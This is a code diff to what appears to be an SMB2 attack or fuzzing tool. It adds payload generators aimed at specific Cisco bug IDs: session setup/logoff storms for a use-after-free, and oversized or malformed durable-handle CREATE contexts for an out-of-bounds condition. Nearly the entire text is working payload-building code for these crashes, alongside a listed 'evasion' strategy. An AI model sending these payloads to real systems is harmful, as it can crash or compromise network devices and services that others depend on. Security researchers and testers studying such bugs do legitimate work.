@@ -73,10 +73,12 @@ SMB2_STRATEGIES = [
     "oplock_lease_flood",
     "multi_protocol_evasion",
     "query_info_overflow",
+    "session_rapid_reuse",
+    "durable_reconnect_overflow",
 ]
 
 SMB2_WEIGHTS = [
-    10, 8, 8, 9, 7, 7, 6, 8, 9, 7, 4, 5, 5,
+    10, 8, 8, 9, 7, 7, 6, 8, 9, 7, 4, 5, 5, 12, 10,
 ]
 
 SMB2_STRATEGY_LABELS = {
@@ -93,6 +95,8 @@ SMB2_STRATEGY_LABELS = {
     "oplock_lease_flood":       "Oplock/Lease Flood",
     "multi_protocol_evasion":   "Multi-Protocol Evasion",
     "query_info_overflow":      "QUERY_INFO/SET_INFO Overflow",
+    "session_rapid_reuse":      "Session Rapid Reuse UAF (CSCwu17809/23995)",
+    "durable_reconnect_overflow": "Durable Reconnect OOB (CSCwq01522)",
 }
 
 # --- SMBv3 strategies (SMB3-specific + shared) ---
@@ -834,6 +838,154 @@ def build_smb_payload(strategy, payload_override=None):
             msgs = b''
             for bl in [0, 1, 0xFFFF, 0xFFFFFFFF, 0x7FFFFFFF]:
                 msgs += _qi(1, 18, output_len=bl, mid=bl & 0xFFFF)
+            return pre + msgs
+
+    # ---- 17. SESSION RAPID REUSE (CSCwu17809, CSCwu23995) ----
+    elif strategy == "session_rapid_reuse":
+        v = random.choice(["setup_logoff_storm", "tree_connect_teardown",
+                           "create_close_reuse", "sid_reuse_after_logoff",
+                           "interleaved_sessions"])
+        if v == "setup_logoff_storm":
+            msgs = b''
+            for i in range(500):
+                sid = random.randint(1, 0xFFFF)
+                ntlm = b'NTLMSSP\x00' + struct.pack("<I", 1) + struct.pack("<I", 0xE2088297) + b'\x00' * 48
+                hdr = _smb2(SMB2_SESSION_SETUP, mid=i*2+1, sid=sid)
+                body = struct.pack("<BBHI", 25, 0, 1, 0) + struct.pack("<I", 0)
+                body += struct.pack("<HH", 88, len(ntlm)) + struct.pack("<Q", 0) + ntlm
+                msgs += _wrap(hdr + body)
+                msgs += _wrap(_smb2(SMB2_LOGOFF, mid=i*2+2, sid=sid) + struct.pack("<HH", 4, 0))
+            return pre + msgs
+        elif v == "tree_connect_teardown":
+            msgs = b''
+            for i in range(500):
+                sid = random.randint(1, 0xFFFF)
+                tid = random.randint(1, 0xFFFF)
+                path = "\\\\s\\IPC$".encode("utf-16-le")
+                hdr = _smb2(SMB2_TREE_CONNECT, mid=i*2+1, sid=sid)
+                body = struct.pack("<HH", 9, 0) + struct.pack("<IH", 72, len(path)) + b'\x00\x00' + path
+                msgs += _wrap(hdr + body)
+                msgs += _wrap(_smb2(SMB2_TREE_DISCONNECT, mid=i*2+2, sid=sid, tid=tid) + struct.pack("<HH", 4, 0))
+            return pre + msgs
+        elif v == "create_close_reuse":
+            msgs = b''
+            fid = os.urandom(16)
+            for i in range(400):
+                n = f"f{i%10}.dat".encode("utf-16-le")
+                hdr = _smb2(SMB2_CREATE, mid=i*2+1, sid=1, tid=1)
+                body = struct.pack("<BBIIIIQQI", 57, 0, 0, 2, 0, 0, 0x12019F, 0x80, 7)
+                body += struct.pack("<IIHH", 1, 0x40, 120, len(n)) + struct.pack("<II", 0, 0) + n
+                msgs += _wrap(hdr + body)
+                msgs += _wrap(_smb2(SMB2_CLOSE, mid=i*2+2, sid=1, tid=1) +
+                             struct.pack("<HH", 24, 0) + struct.pack("<I", 0) + fid)
+            return pre + msgs
+        elif v == "sid_reuse_after_logoff":
+            msgs = b''
+            sid = 0xAAAA
+            msgs += _wrap(_smb2(SMB2_LOGOFF, mid=1, sid=sid) + struct.pack("<HH", 4, 0))
+            for i in range(300):
+                msgs += _wrap(_smb2(SMB2_ECHO, mid=i+2, sid=sid) + _echo_body())
+                if i % 20 == 0:
+                    msgs += _wrap(_smb2(SMB2_LOGOFF, mid=i+1000, sid=sid) + struct.pack("<HH", 4, 0))
+            return pre + msgs
+        else:
+            msgs = b''
+            for i in range(300):
+                sid = (i % 5) + 1
+                if i % 3 == 0:
+                    ntlm = b'NTLMSSP\x00' + struct.pack("<I", 1) + struct.pack("<I", 0xE2088297) + os.urandom(48)
+                    hdr = _smb2(SMB2_SESSION_SETUP, mid=i+1, sid=sid)
+                    body = struct.pack("<BBHI", 25, 0, 1, 0) + struct.pack("<I", 0)
+                    body += struct.pack("<HH", 88, len(ntlm)) + struct.pack("<Q", 0) + ntlm
+                    msgs += _wrap(hdr + body)
+                elif i % 3 == 1:
+                    msgs += _wrap(_smb2(SMB2_ECHO, mid=i+1, sid=sid) + _echo_body())
+                else:
+                    msgs += _wrap(_smb2(SMB2_LOGOFF, mid=i+1, sid=sid) + struct.pack("<HH", 4, 0))
+            return pre + msgs
+
+    # ---- 18. DURABLE RECONNECT OVERFLOW (CSCwq01522) ----
+    elif strategy == "durable_reconnect_overflow":
+        v = random.choice(["extreme_length_handle", "reconnect_after_disconnect",
+                           "create_guid_overflow", "durable_v2_timeout_bomb",
+                           "rapid_durable_cycle"])
+        if v == "extreme_length_handle":
+            cn = b'DHnC\x00\x00\x00\x00'
+            dh_data = os.urandom(65000)
+            ctx = struct.pack("<IHHHHI", 0, 24, 4, 0, 32, len(dh_data)) + cn + dh_data
+            n = "d.dat".encode("utf-16-le")
+            hdr = _smb2(SMB2_CREATE, mid=1, sid=1, tid=1)
+            body = struct.pack("<BBIIIIQQI", 57, 0, 0, 2, 0, 0, 0x12019F, 0x80, 7)
+            body += struct.pack("<IIHH", 1, 0x40, 120, len(n))
+            co2 = 120 + len(n)
+            co2 += (8 - (co2 % 8)) % 8
+            body += struct.pack("<II", co2, len(ctx)) + n
+            body += b'\x00' * ((8 - ((len(body) + 64) % 8)) % 8) + ctx
+            return pre + _wrap(hdr + body)
+        elif v == "reconnect_after_disconnect":
+            msgs = b''
+            msgs += _wrap(_smb2(SMB2_TREE_DISCONNECT, mid=1, sid=1, tid=1) + struct.pack("<HH", 4, 0))
+            cn = b'DHnC\x00\x00\x00\x00'
+            dh_data = os.urandom(16) + struct.pack("<I", 0)
+            ctx = struct.pack("<IHHHHI", 0, 24, 4, 0, 32, len(dh_data)) + cn + dh_data
+            for i in range(200):
+                n = f"r{i}.dat".encode("utf-16-le")
+                hdr = _smb2(SMB2_CREATE, mid=i+2, sid=1, tid=1)
+                body = struct.pack("<BBIIIIQQI", 57, 0, 0, 2, 0, 0, 0x12019F, 0x80, 7)
+                body += struct.pack("<IIHH", 1, 0x40, 120, len(n))
+                co2 = 120 + len(n)
+                co2 += (8 - (co2 % 8)) % 8
+                body += struct.pack("<II", co2, len(ctx)) + n
+                body += b'\x00' * ((8 - ((len(body) + 64) % 8)) % 8) + ctx
+                msgs += _wrap(hdr + body)
+            return pre + msgs
+        elif v == "create_guid_overflow":
+            cn = b'DHnQ\x00\x00\x00\x00'
+            dh_data = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0) + os.urandom(16) + os.urandom(16)
+            ctx = struct.pack("<IHHHHI", 0, 24, 4, 0, 32, len(dh_data)) + cn + dh_data
+            n = "g.dat".encode("utf-16-le")
+            hdr = _smb2(SMB2_CREATE, mid=1, sid=1, tid=1)
+            body = struct.pack("<BBIIIIQQI", 57, 0, 0, 2, 0, 0, 0x12019F, 0x80, 7)
+            body += struct.pack("<IIHH", 1, 0x40, 120, len(n))
+            co2 = 120 + len(n)
+            co2 += (8 - (co2 % 8)) % 8
+            body += struct.pack("<II", co2, len(ctx)) + n
+            body += b'\x00' * ((8 - ((len(body) + 64) % 8)) % 8) + ctx
+            return pre + _wrap(hdr + body)
+        elif v == "durable_v2_timeout_bomb":
+            msgs = b''
+            for i in range(200):
+                cn = b'DH2Q\x00\x00\x00\x00'
+                timeout = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0x02) + os.urandom(16) + os.urandom(16)
+                ctx = struct.pack("<IHHHHI", 0, 24, 4, 0, 32, len(timeout)) + cn + timeout
+                n = f"t{i}.dat".encode("utf-16-le")
+                hdr = _smb2(SMB2_CREATE, mid=i+1, sid=1, tid=1)
+                body = struct.pack("<BBIIIIQQI", 57, 0, 0, 2, 0, 0, 0x12019F, 0x80, 7)
+                body += struct.pack("<IIHH", 1, 0x40, 120, len(n))
+                co2 = 120 + len(n)
+                co2 += (8 - (co2 % 8)) % 8
+                body += struct.pack("<II", co2, len(ctx)) + n
+                body += b'\x00' * ((8 - ((len(body) + 64) % 8)) % 8) + ctx
+                msgs += _wrap(hdr + body)
+            return pre + msgs
+        else:
+            msgs = b''
+            fid = os.urandom(16)
+            for i in range(300):
+                cn = b'DHnC\x00\x00\x00\x00'
+                dh_data = os.urandom(16) + struct.pack("<I", 0)
+                ctx = struct.pack("<IHHHHI", 0, 24, 4, 0, 32, len(dh_data)) + cn + dh_data
+                n = f"c{i%5}.dat".encode("utf-16-le")
+                hdr = _smb2(SMB2_CREATE, mid=i*2+1, sid=1, tid=1)
+                body = struct.pack("<BBIIIIQQI", 57, 0, 0, 2, 0, 0, 0x12019F, 0x80, 7)
+                body += struct.pack("<IIHH", 1, 0x40, 120, len(n))
+                co2 = 120 + len(n)
+                co2 += (8 - (co2 % 8)) % 8
+                body += struct.pack("<II", co2, len(ctx)) + n
+                body += b'\x00' * ((8 - ((len(body) + 64) % 8)) % 8) + ctx
+                msgs += _wrap(hdr + body)
+                msgs += _wrap(_smb2(SMB2_CLOSE, mid=i*2+2, sid=1, tid=1) +
+                             struct.pack("<HH", 24, 0) + struct.pack("<I", 0) + fid)
             return pre + msgs
 
     # Fallback: valid ECHO
